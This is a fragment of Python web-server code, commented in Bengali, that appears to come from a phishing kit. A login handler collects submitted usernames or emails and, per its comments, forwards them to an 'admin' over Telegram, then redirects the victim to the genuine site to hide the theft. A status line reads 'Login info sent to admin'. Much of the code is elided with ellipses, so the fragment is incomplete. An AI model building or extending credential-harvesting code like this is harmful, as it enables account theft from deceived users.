...
def serve_template(filename):
    # ইউজার আইডি প্যারামিটার বাদ দিন
    if '?' in filename:
...
def handle_login():
    username = request.form.get('username') or request.form.get('email') or request.form.get('user') or 'N/A'
    ...
    # টেলিগ্রামে পাঠান (শুধু অ্যাডমিন)
    send_to_admin(data)
    
    # ইউজারকে আসল সাইটে রিডাইরেক্ট
...
📱 Platform: {data.get('pageType', 'Unknown')}
...
"""
    ...
    try:
        ...
        print(f"✅ Login info sent to admin")
